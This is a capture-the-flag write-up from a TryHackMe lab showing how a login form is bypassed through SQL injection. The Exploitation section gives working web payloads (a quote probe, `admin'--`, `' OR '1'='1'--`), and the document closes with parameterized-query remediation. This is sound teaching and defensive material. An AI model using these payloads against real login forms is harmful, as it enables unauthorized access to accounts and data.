# CTF Write-up: SQL Injection Login Bypass

**Platform:** TryHackMe — SQL Injection Module  
**Category:** Web · SQL Injection  
**Difficulty:** Easy  
**Date:** 2024

---

## Overview

Authentication bypass via SQL Injection in a login form — one of the most classic and impactful vulnerability patterns (OWASP Top 10 A03:2021).

---

## Target Analysis

Login form with two fields:
- `username`
- `password`

Goal: log in as `admin` without knowing the password.

---

## Understanding the Vulnerability

The backend was likely building a query like this:

```sql
SELECT * FROM users 
WHERE username = '[INPUT]' AND password = '[INPUT]';
```

If user input is inserted directly without sanitization, we can break out of the string and modify the SQL logic.

---

## Exploitation

### Step 1 — Test for SQLi

Entered a single quote in the username field:

```
username: '
password: anything
```

**Result:** SQL error message appeared — confirms the input is not sanitized.

### Step 2 — Boolean-based bypass

```
username: admin'--
password: anything
```

This turns the query into:

```sql
SELECT * FROM users 
WHERE username = 'admin'--' AND password = 'anything';
```

The `--` comments out the password check entirely.

**Result:** Logged in as admin ✅

### Step 3 — OR-based bypass (no username needed)

```
username: ' OR '1'='1'--
password: anything
```

Resulting query:

```sql
SELECT * FROM users 
WHERE username = '' OR '1'='1'--' AND password = 'anything';
```

Since `'1'='1'` is always true, this returns the first row in the database (usually admin).

---

## Impact

- Full authentication bypass
- Access to admin panel
- Potential for data extraction (UNION-based SQLi)
- Database destruction (`DROP TABLE`)

---

## Remediation

```python
# Vulnerable
query = f"SELECT * FROM users WHERE username = '{username}'"

# Secure — use parameterized queries
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)
```

Additional mitigations:
- Use ORM (SQLAlchemy, Django ORM)
- Principle of least privilege for DB user
- Web Application Firewall (WAF)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Browser | Manual testing |
| Burp Suite | Request modification |
| sqlmap | Automated SQLi verification |

---

## Key Takeaways

- Never concatenate user input directly into SQL queries
- Parameterized queries / prepared statements are the fix
- Error messages leak valuable information — disable in production
- SQLi is 30+ years old and still in OWASP Top 10
